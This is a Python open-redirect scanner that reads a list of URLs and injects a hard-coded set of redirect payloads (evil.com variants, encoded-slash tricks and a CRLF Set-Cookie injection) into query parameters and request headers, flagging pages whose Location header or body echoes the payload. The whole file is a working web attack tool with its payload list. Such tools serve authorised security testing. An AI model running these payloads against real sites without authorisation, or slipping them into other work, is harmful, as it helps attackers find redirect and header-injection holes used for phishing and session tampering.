import requests
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger()

# Payloads and headers to check for open redirects
payloads = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "/%2Fevil.com",
    "/%5Cevil.com",
    "https://evil.com/%2F..",
    "//example.com.evil.com",
    "https://subdomain.evil.com",
    "https://evil.com?redirect=https://legit.com",
    "https://evil.com#@legit.com",
    "https://evil.com?next=https://legit.com",
    "https://evil.com?url=https://legit.com",
    "//evil.com/%2f/",
    "https://evil.com%2F..",
    "https://evil.com/path%0D%0ASet-Cookie:malicious=true",
    "https://evil.com/path?continue=https://legit.com"
]

headers_to_check = [
    "Location",
    "Referer",
    "X-Forwarded-For",
    "X-Redirect-By"
]

def test_url_for_redirect(url, param=None, payload=None, is_header=False, header_name=None):
    """Test a URL for open redirects by checking parameters, headers, or response content."""
    try:
        if is_header:
            headers = {header_name: payload}
            response = requests.get(url, headers=headers, allow_redirects=False, timeout=5)
        else:
            test_url = url.replace(f"{param}=", f"{param}={payload}")
            response = requests.get(test_url, allow_redirects=False, timeout=5)

        # Check for redirection with payload in Location header
        if response.status_code in [200, 301, 302]:
            location_header = response.headers.get("Location", "")
            if location_header == payload:  # Check if Location header exactly matches the payload URL
                return url, param, payload, is_header, header_name, "Redirect"

        # Check if payload is present in the response content (source code)
        if response.status_code == 200 and payload in response.text:
            return url, param, payload, is_header, header_name, "Source Code"

    except requests.exceptions.RequestException as e:
        logger.warning(f"Error with URL {url}: {e}")
    return None

def check_open_redirect(urls):
    vulnerable = []

    def process_url(url):
        """Process each URL for potential open redirects."""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        is_vulnerable = False

        with ThreadPoolExecutor(max_workers=10) as executor:
            # Check parameters for open redirects
            for param, values in query_params.items():
                for value in values:
                    for payload in payloads:
                        if is_vulnerable:
                            break
                        future = executor.submit(test_url_for_redirect, url, param, payload, is_header=False)
                        result = future.result()
                        if result:
                            is_vulnerable = True
                            url, param, payload, _, _, vuln_type = result
                            logger.info(f"[!] Open Redirect detected ({vuln_type}) in URL parameter: {url}")
                            print(f"URL: {url}, Parameter: {param}, Payload: {payload}, Type: {vuln_type}")
                            vulnerable.append((url, "URL", param, payload, vuln_type))
                            break

            # Check headers for open redirects
            if not is_vulnerable:
                for header in headers_to_check:
                    for payload in payloads:
                        if is_vulnerable:
                            break
                        future = executor.submit(test_url_for_redirect, url, header_name=header, payload=payload, is_header=True)
                        result = future.result()
                        if result:
                            is_vulnerable = True
                            url, _, payload, _, header_name, vuln_type = result
                            logger.info(f"[!] Open Redirect detected ({vuln_type}) in header '{header_name}' with payload '{payload}' in URL: {url}")
                            print(f"URL: {url}, Header: {header_name}, Payload: {payload}, Type: {vuln_type}")
                            vulnerable.append((url, "Header", header_name, payload, vuln_type))
                            break

    # Process each URL with progress bar
    for url in tqdm(urls, desc="Scanning URLs", unit="url"):
        process_url(url)

    return vulnerable

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Open Redirect Scanner")
    parser.add_argument("--url", type=str, required=True, help="File containing list of URLs to scan")
    args = parser.parse_args()

    try:
        print("[*] Starting Open Redirect scan...")
        with open(args.url, "r") as f:
            urls = [line.strip() for line in f if line.strip()]

        # Scan for vulnerabilities
        vulnerabilities = check_open_redirect(urls)

        print("\n[✓] Open Redirect scan completed.")
        print("\n[!] Vulnerable URLs with payloads:")
        for vuln in vulnerabilities:
            url, location_type, location, payload, vuln_type = vuln
            if location_type == "Header":
                print(f"URL: {url}, Header: {location}, Payload: {payload}, Type: {vuln_type}")
            else:
                print(f"URL: {url}, Parameter: {location}, Payload: {payload}, Type: {vuln_type}")

    except Exception as e:
        logger.error(f"An unexpected error occurred: {e}")
